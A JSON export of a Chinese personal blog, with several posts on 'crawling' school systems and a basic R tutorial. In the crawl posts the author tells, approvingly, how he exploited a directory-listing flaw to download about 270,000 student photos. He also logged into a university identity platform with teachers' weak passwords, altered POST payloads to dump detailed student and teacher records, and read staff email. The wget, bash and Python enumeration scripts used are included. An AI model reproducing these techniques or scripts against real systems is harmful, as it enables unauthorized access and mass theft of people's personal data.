class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ mkdir /media/sda3</span><br><span class=\"line\">$ mount /dev/sda3 /media/sda3</span><br></pre></td></tr></table></figure>\n</blockquote>\n</li>\n</ul>\n<p>再一次，只想到了这么多，有时间再加吧。</p>\n","categories":["HowTo"],"tags":["小手段"]},{"title":"Crawl From Little III","url":"http://iami.xyz/2016/05/09/Crawl-Freom-Little-III/","content":"<h3 id=\"这篇文章应该是几个星期前就该记录下来的。但世上哪得双全法，不负如来不负卿。\"><a href=\"#这篇文章应该是几个星期前就该记录下来的。但世上哪得双全法，不负如来不负卿。\" class=\"headerlink\" title=\"这篇文章应该是几个星期前就该记录下来的。但世上哪得双全法，不负如来不负卿。\"></a>这篇文章应该是几个星期前就该记录下来的。但<font color=\"green\">世上哪得双全法，不负如来不负卿</font>。</h3><h1 id=\"当成故事来看，未尝不可，但是真的好爽啊\"><a href=\"#当成故事来看，未尝不可，但是真的好爽啊\" class=\"headerlink\" title=\"当成故事来看，未尝不可，但是真的好爽啊\"></a>当成故事来看，未尝不可，但是真的好爽啊</h1><p>事情的起因很简单，就是上周上周上周的上周要进行全校本届毕业生彩像，然后过了大概一周，突然通知说让我们关注一个公众号，输入一串数字+学号+xl去验证是不是自己的照片。然后故事开始了。还有由于是几周之前的事情了，所以就不能在重现截图了。</p>\n<h2 id=\"First：\"><a href=\"#First：\" class=\"headerlink\" title=\"First：\"></a>First：</h2><p>手机wifi连接到我的笔记本，笔记本fiddler开代理。这样所有数据流向将十分清楚。所以很方便的找到了目的ip。然后burp suit拿出来，看看什么什么的，随便猜了下目录，竟然成了。服务器有目录遍历的漏洞，于是就直接写个小脚本wget去了，其实这样的话，并不是太完美，</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">cat schoolname | <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> line</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> ((i=0;i&lt;8;i++));</span><br><span class=\"line\">\t<span class=\"keyword\">do</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsleep 2;\t\t\t</span><br><span class=\"line\">\t\twget -r -c -np -L http://xxxxip/wwtstudentcard/Web/public/appupload/<span class=\"variable\">$line</span>/</span><br><span class=\"line\">\t&#125;&amp;</span><br><span class=\"line\">\t<span class=\"keyword\">done</span>\t </span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>就这样，扔服务器后台跑了一夜(谁让宿舍断网的，大爷的)，12G数据到手，总共27万张左右的图片（筛选之后乱七八糟的文件之后）。上面一个准确讲没什么技术含量，如果思路加小技巧算的话。</p>\n<h2 id=\"Second：\"><a href=\"#Second：\" class=\"headerlink\" title=\"Second：\"></a>Second：</h2><p>拿到数据，有点多，但是有的目录是空的，有的还有html后缀的文件，还有的是学校的校徽，但是校徽的图片命名很规律，xiaohui.png .于是最后花了两天把所有空白文件删除，各种无关文件删除，并重命名图片文件名为学校代码+学号，并把大图和小图分别打包压缩，放到不同的文件夹中。当时发现一个很重要的事，就是一定要判断是不是文件，当时判断的时候默认是进入每个文件夹操作，结果有一个是文件，cd不了，肯定有错误，虽然是循环来处理，这个错误即使出现也不影响后面的操作，但还是值得注意，绝对。毕竟设计的脚本思路是进入文件夹，那么就应该判断是不是文件夹（只怪当时清理文件忘了清理校徽文件）。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat hhhh | <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> line</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">\t<span class=\"built_in\">cd</span> <span class=\"variable\">$line</span></span><br><span class=\"line\">\tls | <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> dirtype</span><br><span class=\"line\">\t<span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t<span class=\"comment\">#cd $dirtype</span></span><br><span class=\"line\">\t\t<span class=\"comment\">#echo \"Now I'm in:\"  &gt;&gt; ../log</span></span><br><span class=\"line\">\t\t<span class=\"comment\">#echo pwd  \t    &gt;&gt; ../log</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">cd</span> <span class=\"variable\">$dirtype</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> fn <span class=\"keyword\">in</span> *.jpg</span><br><span class=\"line\">\t\t<span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t\tmv <span class=\"variable\">$fn</span> $(<span class=\"built_in\">pwd</span> | grep -E <span class=\"string\">\"[0-9]\"</span> | awk -F <span class=\"string\">\"/\"</span> <span class=\"string\">'&#123;print $4&#125;'</span></span><br><span class=\"line\">)<span class=\"variable\">$fn</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">done</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">cd</span> ..</span><br><span class=\"line\">\t\t<span class=\"comment\">#tar -cvzf $line.tar.gz $line</span></span><br><span class=\"line\">\t\t<span class=\"comment\">#cd ..</span></span><br><span class=\"line\">\t<span class=\"keyword\">done</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">#echo \"Job Done \"    &gt;&gt; log</span></span><br><span class=\"line\">\t<span class=\"built_in\">cd</span> ..</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Third：\"><a href=\"#Third：\" class=\"headerlink\" title=\"Third：\"></a>Third：</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ find -<span class=\"built_in\">type</span> d -empty\t<span class=\"comment\">#找出所有的空文件夹</span></span><br><span class=\"line\">$ find <span class=\"variable\">$PWD</span> <span class=\"comment\">#得到的是绝对路径 $pwd（小写的得到相对路径）</span></span><br></pre></td></tr></table></figure>\n<p>当时移除所有数据之后，准备</p>\n<p>ls -aR | sed “s:^:<code>pwd</code>/:” &gt; listto_mongo<br>cat listto_mongo | grep -v “.jpg” &gt; temp<br>cat temp | while read line<br>do<br>    sed ‘s/$line//‘ listto_mongo</p>\n<p>done</p>\n<h1 id=\"Finally\"><a href=\"#Finally\" class=\"headerlink\" title=\"Finally:\"></a>Finally:</h1><p><img src=\"/images//crawl/allimg.png\" alt=\"tupian1\"><br>这是最后清洗完成后的数据，<br>最开始是这个样子的：<br><img src=\"/images//crawl/wenjianjia.png\" alt=\"tupian2\"><br>后来处理并整理，可以从下面看出来虽然没考虑xiaohui.png这个问题，虽然有错误，但是但是竟然把xiaohui.png也打包了。<br><img src=\"/images//crawl/22222.png\" alt=\"tupian3\"></p>\n<p><img src=\"/images//crawl/normalimg.png\" alt=\"tupian4\"><br>最后这个是准备重命名，并得到所有的绝对路径之后，导入到mongo中去，但是现在我觉得这不是一个好主意，虽然GridFs设计的就是为这种不大不小的文件而生，而且放入数据库便于携带，但是还是不得不说，速度并不快。<br><img src=\"/images//crawl/rename.png\" alt=\"tupian5\"><br>一开始是打算用python+pymongo获取所有的文件并插入进去，但是后来发现mongofiles -d images put xxxx.png就可以实现，这样的话一个几行的shell就能搞定了，直接读取所有保存文件路径名的文本，多个线程插入即可。但是其实这也不好。因为我的照片即使是大的也没有256k,那么就不会把一个照片分块存储，而且每次存取将十分麻烦。虽然mongo可以访问远程mongo服务器，但总的来讲，对我并不是一个好主意。但是出于各种原因还是存了(哭笑不得)。<br>顺便，和好朋友一起，告诉他这个东西之后，他也在他的服务器上抓了所有的，而且直接保存到sqlite了，虽然我觉的这种东西都不应该放到数据库，但是一切为了备份～_～</p>\n<h1 id=\"End\"><a href=\"#End\" class=\"headerlink\" title=\"End\"></a>End</h1><p>最后作为一个小菜鸟，路还很长，这是我习惯说的一句话，虽然有点啰嗦。还有一些小脚本，去服务器看时，发现已经没了，所以贴不来了。</p>\n","categories":["学习数据挖掘的路上"],"tags":["学习笔记","抓取数据"]},{"title":"Crawl From Little II","url":"http://iami.xyz/2016/04/10/Crawl-From-Little-II/","content":"<h4 id=\"接上回那个勉强算得上或算不上抓取的回忆，但是那些数据之中有一些很敏感的信息，包括教师的详细信息，利用这个信息登陆统一身份验证平台，想必又会有收货呢\"><a href=\"#接上回那个勉强算得上或算不上抓取的回忆，但是那些数据之中有一些很敏感的信息，包括教师的详细信息，利用这个信息登陆统一身份验证平台，想必又会有收货呢\" class=\"headerlink\" title=\"接上回那个勉强算得上或算不上抓取的回忆，但是那些数据之中有一些很敏感的信息，包括教师的详细信息，利用这个信息登陆统一身份验证平台，想必又会有收货呢\"></a>接上回那个勉强算得上或算不上抓取的回忆，但是那些数据之中有一些很敏感的信息，包括教师的详细信息，利用这个信息登陆统一身份验证平台，想必又会有收货呢</h4><h3 id=\"登陆统一身份验证平台\"><a href=\"#登陆统一身份验证平台\" class=\"headerlink\" title=\"登陆统一身份验证平台\"></a>登陆统一身份验证平台</h3><p>在登陆的过程中，发现女老师对密码安全基本是没什么意识的，虽然你们也是计算机学院的，但是你们真的好意思说你们是计算机学员的吗？<br>在登陆进去，发现老师可以查询学生的信息（仅包含姓名学号，班级），看了看挺失望的，毕竟这些信息没什么鸟用，但是当我看网页源码的时候，发现这个系统的开发人员很不负责，只是把之前写的文本框给遮盖了，但是还是靠那个传数据。于是抓包分析，发现是post request payload，response的结果却是student的详细信息(一应俱全，应有尽有),好呗<br>不得不说，很激动，抓呗。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#-*-coding:utf-8-*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib2</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> encodings</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"\"</span></span><br><span class=\"line\">header=&#123;&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">xs</span><span class=\"params\">(request_payload)</span>:</span></span><br><span class=\"line\">\trequest = urllib2.Request(url, headers=headers, data=urllib.urlencode(request_payload))</span><br><span class=\"line\">\tresponse = urllib2.urlopen(request, timeout=<span class=\"number\">5</span>)</span><br><span class=\"line\">\tcontent = response.read()</span><br><span class=\"line\">\tprint(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">70</span>):</span><br><span class=\"line\">\tm_request_payload = &#123;</span><br><span class=\"line\">\t<span class=\"string\">'callCount'</span>:<span class=\"string\">'1'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'httpSessionId'</span>:<span class=\"string\">'ssssssssssssssssssssssssss'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'scriptSessionId'</span>:<span class=\"string\">'sssssssssssssssssssssssss'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'page'</span>:<span class=\"string\">'/xxxxx/xxxxx/171'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'c0-scriptName'</span>:<span class=\"string\">'XSXXDwrAction'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'c0-methodName'</span>:<span class=\"string\">'getList'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'c0-id'</span>:<span class=\"string\">'165116513216516'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'c0-param0'</span>:<span class=\"string\">'number:'</span>+ str(i),</span><br><span class=\"line\">\t<span class=\"string\">'c0-param1'</span>:<span class=\"string\">'null:null'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'c0-param2'</span>:<span class=\"string\">'null:null'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'c0-param3'</span>:<span class=\"string\">'string:'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'c0-param4'</span>:<span class=\"string\">'number:15'</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">xs(m_request_payload)</span><br></pre></td></tr></table></figure>\n<p>当然这还没有解码，数据获取的类型是<br><img src=\"/images//crawl/5.png\" alt=\"img5\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span>  re</span><br><span class=\"line\">pattern = <span class=\"string\">r'\"(.*?)\"'</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> open(<span class=\"string\">'IDinfomation'</span>,<span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    key = re.findall(pattern,f.read())</span><br><span class=\"line\">    <span class=\"keyword\">for</span> peopele <span class=\"keyword\">in</span> key:</span><br><span class=\"line\">    tt=peopele.decode(<span class=\"string\">'raw_unicode_escape'</span>).encode(<span class=\"string\">'utf-8'</span>)</span><br></pre></td></tr></table></figure>\n<p>最后稍微提取一下就能得到详细的信息了，全是你想要的，如果在内网中，还可以通过统一身份平台跳到教务系统，然后把这些人的图片爬下来，哈哈，想想都有点激动呢。</p>\n<p>然后晚上的时候，登一个账号发现里面的通讯录的response也是很奇怪，把老师的详细信息都response了，稍微改下post,于是所有的老师更加详细的信息到手。而且没事还挑了几个老师的学校邮箱看了看，不过并没有什么有用的。<br>本来想做个统计，绘个图表，结果发现统一信息门户里面都已经给了可视化的图，虽然很丑。不过我现在数据并未完全组织好，也没插入到数据库，电脑估计是要重装了。之前折腾的有问题了。</p>\n<p>最后，老师来查mac地址，希望没事吧。虽然这个没有什么技术含量，但是还是很有动力的。</p>\n","categories":["学习数据挖掘的路上"],"tags":["学习笔记","抓取数据"]},{"title":"Crawl From Little I","url":"http://iami.xyz/2016/04/07/Crawl-From-Little/","content":"<h4 id=\"找到最适合自己的抓取方式，不论是Python-wget-curl-NodeJs-R-，随便你，开心就好-抓取的数据要有效率\"><a href=\"#找到最适合自己的抓取方式，不论是Python-wget-curl-NodeJs-R-，随便你，开心就好-抓取的数据要有效率\" class=\"headerlink\" title=\"找到最适合自己的抓取方式，不论是Python, wget,curl, NodeJs, R ，随便你，开心就好(抓取的数据要有效率)\"></a>找到最适合自己的抓取方式，不论是Python, wget,curl, NodeJs, R ，随便你，开心就好(抓取的数据要有效率)</h4><h2 id=\"起源\"><a href=\"#起源\" class=\"headerlink\" title=\"起源\"></a>起源</h2><p> 事情的起源是，someday，我发现了学校的一个网站有信息泄露了,背单词苦逼到几点我，好想日站。然而，我怎么能做这种有辱xx的事呢，好了借口找不到了，切入正文。</p>\n<p> 找到url,　构造类似与　xxx.edu.cn/xxx.jsp?tableid=yyy<br> 由于我当时并不知道，到底1-yyyy之间有多少有用的，所以就直接把1-yyyy之间全抓了，而且傻逼的最开始并未考虑其中有的表页是空白。当时就用了几行代码,用的自带的wget，写了个循环了事。</p>\n<hr>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> &#123;1..800&#125;</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> http://xxx.xxx.edu.cn:8081/KingoKJ/taglib/DataTable1.jsp?tableId=<span class=\"variable\">$i</span> &gt;&gt;myurl</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\">  time cat myurl|<span class=\"keyword\">while</span> <span class=\"built_in\">read</span> line;<span class=\"keyword\">do</span> curl -l <span class=\"variable\">$line</span> -m 5 --connect-timeout 5 -o /dev/null -s -w <span class=\"string\">\"<span class=\"variable\">$line</span> \"</span>%&#123;http_code&#125;<span class=\"string\">\" \"</span>%&#123;size_download&#125;<span class=\"string\">\"\\n\"</span> &gt;&gt;kb_TEST ; <span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>这一次测试出了有哪些空白页，没办法数据不是可用的，输出的都是这样的<br><img src=\"/images//crawl/1.png\" alt=\"img\"></p>\n<p>从图上就可以看出最小的是1026字节，于是乎稍加修改可以得到这样的结果，url全是验证过的具有内容的。<br><img src=\"/images//crawl/2.png\" alt=\"img1\"></p>\n<p>然后就可以简单的抓下来网页，顺便截个图。<br>截图是用的phantomjs ,当时怕要是自己分析不好，先拿个一眼能看的数据备份一份下来。<br>在zsh中安装Phantom之后可能无法直接使用，要切换回bash才行<br>1.截图的js代码，参考官网，不过当时测试时，怕截不完整，查了下资料</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> page = <span class=\"keyword\">new</span> WebPage(),</span><br><span class=\"line\">    address, output, size;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> (phantom.args.length &lt; <span class=\"number\">2</span> || phantom.args.length &gt; <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'Usage: rasterize.js URL filename'</span>);</span><br><span class=\"line\">    phantom.exit();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    address = phantom.args[<span class=\"number\">0</span>];</span><br><span class=\"line\">    output = phantom.args[<span class=\"number\">1</span>];</span><br><span class=\"line\">    page.viewportSize = &#123; <span class=\"attr\">width</span>: <span class=\"number\">500</span>, <span class=\"attr\">height</span>:<span class=\"number\">1000</span>&#125;</span><br><span class=\"line\">    \t</span><br><span class=\"line\">    <span class=\"comment\">//如何滚动到页面底部，你可以设置显示器很大很大就行了</span></span><br><span class=\"line\">    page.open(address, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">status</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (status !== <span class=\"string\">'success'</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"string\">'Unable to load the address!'</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">window</span>.setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">                page.render(output);</span><br><span class=\"line\">                phantom.exit();</span><br><span class=\"line\">            &#125;, <span class=\"number\">200</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>然后就是配合一个极为简单的shell脚本，循环一下，wget到全部。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat usefulurl | <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> line</span><br><span class=\"line\"><span class=\"keyword\">do</span> </span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$line</span> </span><br><span class=\"line\">wget <span class=\"variable\">$line</span> &gt; <span class=\"variable\">$line</span></span><br><span class=\"line\">phantomjs jietu.js <span class=\"variable\">$line</span> <span class=\"variable\">$line</span>.png</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>这里发现如果你是url新建的是url类型的文件夹，他会建连续一串嵌套的文件，针对这里抓到的截图文件<br><img src=\"/images//crawl/3.png\" alt=\"img3\"><br>其他的则是正常的<br><img src=\"/images//crawl/4.png\" alt=\"img4\"></p>\n<p>其实呢，针对我这个地方的抓取，用R是更加的方便的，通过rvest包，可以很方便的将获取所有表格。虽然我并没有采取使用R的方法，一开始写的python脚本，也是循环get数据，但是并不如wget更好使。本来打算一次性放在这篇里面，但是有点累了，决定把另一半放到下一篇再写。另外抓这个的时候还是很兴奋的，一连搞了一天多。还有我的好朋友，谢谢你。</p>\n","categories":["学习数据挖掘的路上"],"tags":["学习笔记","抓取数据"]},{"title":"The Basic Use Of R","url":"http://iami.xyz/2016/03/27/R-Basiclly Use/","content":"<h5 id=\"有天想爬下拉勾的数据看看。而恰恰又在阿里买了9块9一个月的服务器-其实不咋样，安装R的一个包时就死机了-，好像不爬下都对不起这个价格。朋友说先直接在网上搜搜看看有没有现成的，结果就看到了别人用R和rvest去抓拉勾的数据。而之前恰恰买过《R语言实用数据分析和可视化技术》，所以今天就重记录一下学的一些R的基本知识，也好缓解缓解天天背单词的蛋疼生活。\"><a href=\"#有天想爬下拉勾的数据看看。而恰恰又在阿里买了9块9一个月的服务器-其实不咋样，安装R的一个包时就死机了-，好像不爬下都对不起这个价格。朋友说先直接在网上搜搜看看有没有现成的，结果就看到了别人用R和rvest去抓拉勾的数据。而之前恰恰买过《R语言实用数据分析和可视化技术》，所以今天就重记录一下学的一些R的基本知识，也好缓解缓解天天背单词的蛋疼生活。\" class=\"headerlink\" title=\"有天想爬下拉勾的数据看看。而恰恰又在阿里买了9块9一个月的服务器(其实不咋样，安装R的一个包时就死机了)，好像不爬下都对不起这个价格。朋友说先直接在网上搜搜看看有没有现成的，结果就看到了别人用R和rvest去抓拉勾的数据。而之前恰恰买过《R语言实用数据分析和可视化技术》，所以今天就重记录一下学的一些R的基本知识，也好缓解缓解天天背单词的蛋疼生活。\"></a>有天想爬下拉勾的数据看看。而恰恰又在阿里买了9块9一个月的服务器(其实不咋样，安装R的一个包时就死机了)，好像不爬下都对不起这个价格。朋友说先直接在网上搜搜看看有没有现成的，结果就看到了别人用R和rvest去抓拉勾的数据。而之前恰恰买过《R语言实用数据分析和可视化技术》，所以今天就重记录一下学的一些R的基本知识，也好缓解缓解天天背单词的蛋疼生活。</h5><h1 id=\"包的安装加载卸载\"><a href=\"#包的安装加载卸载\" class=\"headerlink\" title=\"包的安装加载卸载\"></a>包的安装加载卸载</h1><blockquote>\n<pre><code>install.packages(&quot;rvest&quot;)           #安装\nrequire(rvest) 或 library(rvest)                    #加载,好像还有一个是用supremessage\ndetach(&quot;package:rvest&quot;)           #卸载\n</code></pre></blockquote>\n<h1 id=\"R语言基础\"><a href=\"#R语言基础\" class=\"headerlink\" title=\"R语言基础\"></a>R语言基础</h1><ol>\n<li>基础之基础<blockquote>\n<ul>\n<li>基本的加减乘除，赋值可以用 &lt;- ，或assign(“s”,55)    删除变量直接rm(变量名).     判断什么类型：     is.numeric(x)  is.logical(k)   </li>\n<li>日期  data &lt;- as.Date(“2016-03-03”)  </li>\n<li>缺失数据用NA代替</li>\n<li>向量什么的可以直接加减乘除</li>\n<li>字符数据 t &lt;- “data” 和 t &lt;- factor(“data”)是不一样的 </li>\n</ul>\n</blockquote>\n</li>\n<li><p>数据框<br>&gt;<br><img src=\"/images//R/Rdataframe.png\" alt=\"dataframe\"><br>对于数据框可以通过</p>\n<blockquote>\n<ul>\n<li>ncol(DF), nrow(DF),dim(DF)分别得到列数，行数，和行列数。</li>\n<li>names(DF)得到数据框的列名</li>\n<li>names(DF)[1] 得到第一个元素</li>\n<li>rownames(DF)查看指定数据框的行名字</li>\n<li>head(DF , n = 8) 显示前面多少行的DF，也可以用 tail<br><img src=\"/images//R/Rdataframe2.png\" alt=\"dataframe2\"></li>\n</ul>\n<p>列表框的每一列都是一个独立的向量，即每一列都有自己的类 </p>\n</blockquote>\n</li>\n<li><p>列表<br>&gt;</p>\n<ul>\n<li>list(1,2,3,4)</li>\n<li>list(DF,1:10)</li>\n<li>(emptylist &lt;- vector(mode = “list”, length =4 ))      用vector创建一个具有一定长度的空列表</li>\n</ul>\n</li>\n<li><p>矩阵和数组</p>\n<blockquote>\n<ul>\n<li>A &lt;- matrix(1:10, nrow = 5)    </li>\n<li>colname(A), dim(A), ncol(A), nrow(A)</li>\n<li>B &lt;- array(1:11, dim = c(2,3,2)</li>\n</ul>\n</blockquote>\n</li>\n</ol>\n<h1 id=\"导入数据-（还可以直接读网络上的数据）\"><a href=\"#导入数据-（还可以直接读网络上的数据）\" class=\"headerlink\" title=\"导入数据 （还可以直接读网络上的数据）\"></a>导入数据 （还可以直接读网络上的数据）</h1><ol>\n<li><p>导入CSV(Excel数据要转换成CSV才能导入)</p>\n<blockquote>\n<p> url &lt;- “test.csv”<br>  t &lt;- read.table(file = url, header = TRUE, sep = “,” )</p>\n</blockquote>\n</li>\n<li><p>导入数据库</p>\n<blockquote>\n<pre><code>require(RODBC); \ndb &lt;- odbcConnect(&quot;mysql_data&quot;, uid=&quot;root&quot;, pwd=&quot;123&quot;); \nsqlTables(channel #查看数据中的表    \ndata&lt;-sqlFetch(channel,&quot;kk&quot;)\n</code></pre></blockquote>\n</li>\n<li><p>导入其他数据格式</p>\n<blockquote>\n<p>| R  | type|<br>| ——–| :———-:| ——:|<br>| read.spss | SPSS|<br>| read.dta   | Stata|<br>| read.ssd  | SAS   |<br>|read.octave|Octave|<br>|read.mtp| Minitab|<br>|read.systat|Systat|</p>\n</blockquote>\n</li>\n</ol>\n<h1 id=\"抓取数据\"><a href=\"#抓取数据\" class=\"headerlink\" title=\"抓取数据\"></a>抓取数据</h1><ol>\n<li><p>XML</p>\n<blockquote>\n<p>  require(XML)<br>  URL &lt;- “<a href=\"http://baidu.com\" target=\"_blank\" rel=\"noopener\">http://baidu.com</a>“<br>  biubiu &lt;- readHTMLTable(URL,which = 1, header = FALSE, stringsAsFactors = FALSE)</p>\n</blockquote>\n</li>\n<li><p>rvest</p>\n<blockquote>\n<p>  直接来看看这个吧<br><a href=\"http://www.reed.edu/data-at-reed/resources/R/rvest.html\" target=\"_blank\" rel=\"noopener\">rvest</a></p>\n<pre><code> 现在的t &lt;- html(url)已经不用的,转变为 t &lt;- read_html(url)\n主要的东西还是要看Demo和官网的doc\n</code></pre></blockquote>\n</li>\n</ol>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" 